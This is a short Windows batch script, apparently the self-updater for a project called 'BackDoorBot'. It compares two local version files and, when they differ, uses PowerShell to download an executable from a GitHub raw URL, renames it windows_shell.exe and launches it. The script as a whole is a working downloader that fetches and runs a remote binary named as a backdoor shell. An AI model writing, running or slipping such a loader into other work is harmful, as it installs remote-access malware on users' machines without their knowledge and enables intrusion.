@echo off

@REM powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/vers/version.txt -OutFile file.txt"

SetLocal EnableDelayedExpansion
set /a c=0

for /f "UseBackQ Delims=" %%A IN ("vers/version.txt") do (
  set /a c+=1
  if !c!==1 set "a=%%A"
)
echo.%a%

set /a cm=0

for /f "UseBackQ Delims=" %%A IN ("vers/vers.txt") do (
  set /a cm+=1
  if !cm!==1 set "b=%%A"
)
echo.%b%

IF %a% == %b% start windows_shell.exe && exit

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile vers/windows_shell.exe"

del windows_shell.exe
copy vers\windows_shell.exe windows_shell.exe
del vers\windows_shell.exe

echo %a% > vers\vers.txt

start windows_shell.exe
exit